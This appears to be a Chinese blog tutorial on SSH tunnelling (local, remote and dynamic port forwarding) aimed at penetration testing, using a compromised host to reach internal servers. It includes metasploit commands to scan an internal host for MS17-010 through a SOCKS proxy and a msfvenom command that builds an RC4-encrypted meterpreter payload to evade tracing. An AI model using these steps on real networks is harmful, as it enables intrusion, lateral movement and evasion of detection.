---
title: 基于ssh加密隧道的端口转发技术实现
date: 2020-06-06 16:36:17
tags:
---

## 概述

SSH会自动加密和解密所有SSH客户端与服务端之间的网络数据，还能够将其他TCP端口的网络数据通过SSH连接进行转发，并且自动提供了相应的加密及解密服务，这一过程被叫做“SSH隧道” (tunneling)。

SSH隧道加密传输有两大优势：
- 加密SSH Client 端至SSH Server 端之间的通讯数据
- 突破防火墙的限制完成一些之前无法建立的TCP 连接

通过使用SSH加密隧道，可以实现以下功能：
- 远端主机的命令行终端，例如mac的Terminal
- 远端主机的文件传输，例如sftp文件传输
- 远端主机的端口转发，这就是本文重点研究的内容， 即通过绑定一个本地端口，将所有发向这个端口的数据包，都会被加密并透明地传输到远端系统。

## ssh命令的环境依赖

SSH是基于C/S模式的架构，其配置文件分为：

### Server端的配置文件

- `/etc/ssh/sshd_config`

可以通过以下命令启动sshd的服务：`# service ssh restart`
配置文件的核心内容包括：

```
AllowTcpForwarding yes      # 是否允许TCP转发，默认值为”yes”。
GatewayPorts yes            # 是否允许远程主机连接本地的转发端口，默认值是”no”,可以防止连接到服务器计算机外部的转发端口。
TCPKeepAlive yes            # 允许任何人连接到转发的端口。如果服务器在公共互联网上，互联网上的任何人都可以连接到端口。
PasswordAuthentication yes  # 
```

参数详解
- AllowTcpForwarding：是否允许TCP转发，默认值为”yes”。

- GatewayPorts：是否允许远程主机连接本地的转发端口，默认值是”no”。
    - GatewayPorts no: 这可以防止连接到服务器计算机外部的转发端口。
    - GatewayPorts yes: 这允许任何人连接到转发的端口。如果服务器在公共互联网上，互联网上的任何人都可以连接到端口。

- GatewayPorts clientspecified：这意味着客户端可以指定一个IP地址，该IP地址允许连接到端口的连接。其命令是：
    `ssh -R 1.1.1.1:8080:localhost:80 www.example.com`
    在这个例子中，只有来自IP地址为1.1.1.1且目标端口是8080的被允许。

- TCPKeepAlive：指定系统是否向客户端发送 TCP keepalive 消息，默认值是”yes”。
    这种消息可以检测到死连接、连接不当关闭、客户端崩溃等异常。可以理解成保持心跳，防止 ssh 断开。

### Client端的配置文件

- `/etc/ssh/ssh_config`
- 用户配置文件：`~/.ssh/config`

## ssh命令的参数详解

关于建立ssh隧道时所用到一些参数的详细解释：

```
-C 压缩传输，加快传输速度
-f 在后台对用户名密码进行认证
-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行
-q 安静模式，不要显示任何debug信息
-l 指定ssh登录名
-g 允许远程主机连接到本地用于转发的端口
-L 进行本地端口转发
-R 进行远程端口转发
-D 动态转发，即socks代理
-T 禁止分配伪终端
-p 指定远程ssh服务端口
```

## 工作模式一：本地转发

把本地端口数据转发到远程服务器，本地服务器作为SSH客户端及应用户端，称为正向 tcp 端口加密转发。

基础环境
本地攻击机 10.11.42.99
☁️VPS 192.168.144.174
☁️目标Widnwos Web服务器(出网) 192.168.144.210

具体流程
先在本地攻击机执行ssh转发，之后用远程桌面连接本地的33389端口，实际是连接192.168.144.210的远程桌面。
简单说 就是通过☁️VPS这台机器把本地攻击机的33389端口转到了☁️目标服务器的3389端口上，也就是说这个ssh 隧道是建立在本地攻击机与☁️VPS之间的。
1 | ssh -C -f -N -g -L listen_port:DST_Host:DST_port user@Tunnel_Host
2 | ssh -C -f -N -g -L 33389:192.168.144.210:3389 root@192.168.144.174 -p 22

## 工作模式二：远端转发

把远程端口数据转发到本地服务器，本地服务器作为SSH客户端及应用服务端，称为反向tcp端口加密转发。
基础环境
☁️VPS 10.11.42.99
☁️目标Linux Web服务器(出网) 192.168.144.174
目标Widnwos Web服务器(不出网) 192.168.144.210
必要配置
现已获取☁️目标服务器(出网)权限，在该机器上修改 ssh 配置：
1 | # vim /etc/ssh/sshd_config
2 | 
3 | AllowTcpForwarding yes
4 | GatewayPorts yes
5 | TCPKeepAlive yes
6 | PasswordAuthentication yes
7 | 
8 | # service ssh restart
具体流程
继续在☁️目标服务器(出网)执行ssh转发，通过 ☁️VPS这台机器，把来自外部的33389端口流量都转到目标服务器(不出网)的 3389 上。
1 | ssh -C -f -N -g -R listen_port:DST_Host:DST_port user@Tunnel_Host
2 | ssh -C -f -N -g -R 33389:192.168.144.210:3389 anonysec@10.11.42.99 -p 22

回到 ☁️VPS这台机器，查看33389端口是否处于监听状态。如果处于监听状态，则说明ssh隧道建立成功。

注意：隧道建立成功后，默认并非监听在 0.0.0.0，而是监听在 127.0.0.1，可以用rinetd再做一次本地转发。
先在☁️VPS上装好rinetd，之后在rinetd配置文件中添加一条转发规则。
1 | apt install rinetd -y
2 | vim /etc/rinetd.conf
3 | 
4 | 0.0.0.0 3389 127.0.0.1 33389 #转发规则
5 | 
6 | service rinetd start

rinetd本地转发后，查看端口是否处于监听状态。
1 | netstat -an |egrep "3389|33389"

远程连接☁️VPS的3389端口，成功连接进入目标服务器(不出网)的远程桌面中。

## 工作模式二：动态转发

动态端口转发实际上是建立一个ssh正向加密的socks4/5代理通道，任何支持socks4/5协议的程序都可以使用这个加密的通道来进行代理访问，称为正向加密socks。
基础环境
☁️VPS 10.11.42.99
☁️目标Linux Web服务器(出网) 192.168.144.174
目标Widnwos Web服务器(不出网) 192.168.144.210
目标Widnwos Web2服务器(不出网) 192.168.144.155
必要配置
现已获取☁️目标服务器(出网)权限，在该机器上修改 ssh 配置：
1 | # vim /etc/ssh/sshd_config
2 | 
3 | AllowTcpForwarding yes
4 | GatewayPorts yes
5 | TCPKeepAlive yes
6 | PasswordAuthentication yes
7 | 
8 | # service ssh restart
具体流程
在☁️VPS执行ssh转发，并查看10080端口是否处于监听状态。
1 | ssh -C -f -N -g -D listen_port user@Tunnel_Host
2 | ssh -C -f -N -g -D 10080 anonysec@10.11.42.99 -p 22 #监听127.0.0.1
3 | ssh -C -f -N -g -D 0.0.0.0:10080 anonysec@10.11.42.99 -p 22 #监听0.0.0.0

回到metasploit机器上，挂 socks 代理，扫描内网服务器MS17_010。
1 | sudo msfconsole -q
2 | msf5 > setg proxies socks5:10.11.42.99:10080
3 | msf5 > use auxiliary/scanner/smb/smb_ms17_010
4 | msf5 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 192.168.144.210
5 | msf5 auxiliary(scanner/smb/smb_ms17_010) > set threads 10
6 | msf5 auxiliary(scanner/smb/smb_ms17_010) > run

双重加密
利用”ssh隧道+rc4双重加密”去连接目标内网下指定机器上的meterpreter，让payload变的更加难以追踪。
首先，用msfvenom生成bind的rc4 payload，并将rc4.exe传入到目标Web2服务器(不出网)中，并执行。
1 | msfvenom -p windows/meterpreter/bind_tcp_rc4 rc4password=AnonySec lport=443 -f exe -o rc4.exe
回到metasploit机器上，挂 socks 代理，直接bind连接到目标内网中Web2服务器(不出网)的meterpreter下。
1 | sudo msfconsole -q
2 | msf5 > setg proxies socks5:10.11.42.99:10080
3 | msf5 > use exploit/multi/handler
4 | msf5 exploit(multi/handler) > set payload windows/meterpreter/bind_tcp_rc4
5 | msf5 exploit(multi/handler) > set rc4password AnonySec
6 | msf5 exploit(multi/handler) > set rhost  192.168.144.155
7 | msf5 exploit(multi/handler) > set lport 443
8 | msf5 exploit(multi/handler) > run -j

---

## 附录一：autossh命令

在Linux上配置开机自动启动autossh，可以免去了重启Linux后要自己启动的autossh的麻烦。
具体实现是在`/etc/rc.local`中增加如下配置信息，即可实现自动启动了。

``` txt
autossh -M 8000  -fNR 8099:localhost:8999 root@59.113333.11  -p 22
```

